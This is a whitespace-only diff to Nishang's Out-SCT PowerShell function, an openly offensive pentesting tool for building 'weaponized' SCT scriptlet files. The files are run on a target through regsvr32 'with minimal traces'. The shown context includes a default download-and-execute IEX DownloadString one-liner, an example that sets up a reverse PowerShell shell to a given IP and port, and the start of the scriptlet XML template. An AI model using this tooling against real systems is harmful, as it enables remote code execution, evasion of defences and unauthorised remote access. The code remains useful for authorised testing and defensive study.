@@ -5,8 +5,8 @@ function Out-SCT
 Nishang script useful for creating "weaponized" SCT files which could be used to run PowerShell commands and scripts.
 
 .DESCRIPTION
-The script generates a SCT file with an XML extension. The file (default name UpdateCheck.xml) needs to be 
-hosted on a web server and using regsvr32 built-in executable it could be executed on a target with minimal traces. 
+The script generates a SCT file with an XML extension. The file (default name UpdateCheck.xml) needs to be
+hosted on a web server and using regsvr32 built-in executable it could be executed on a target with minimal traces.
 
 The extension of the generated file doesn't matter and any extension can be used.
 
@@ -27,7 +27,7 @@ Path to the directory where the files would be saved. Default is the current dir
 .EXAMPLE
 PS > Out-SCT -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
-Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
+Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file
 named "UpdateCheck.xml" would be generated in the current directory.
 
 
@@ -44,14 +44,14 @@ Use above for a Reverse PowerShell Session. Note that there is no need of downlo
 .LINK
 http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
 https://github.com/samratashok/nishang
-#> 
+#>
 
     [CmdletBinding()] Param(
-        
+
         [Parameter(Position = 0, Mandatory = $False)]
         [String]
         $Payload,
-        
+
         [Parameter(Position = 1, Mandatory = $False)]
         [String]
         $PayloadURL,
@@ -69,12 +69,12 @@ https://github.com/samratashok/nishang
     if(!$Payload)
     {
         $Payload = "powershell IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
-    }  
+    }
     #Below code comes from https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
     $cmd = @"
 <?XML version="1.0"?>
 <scriptlet>
-<registration 
+<registration
     progid="WinCheck"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 
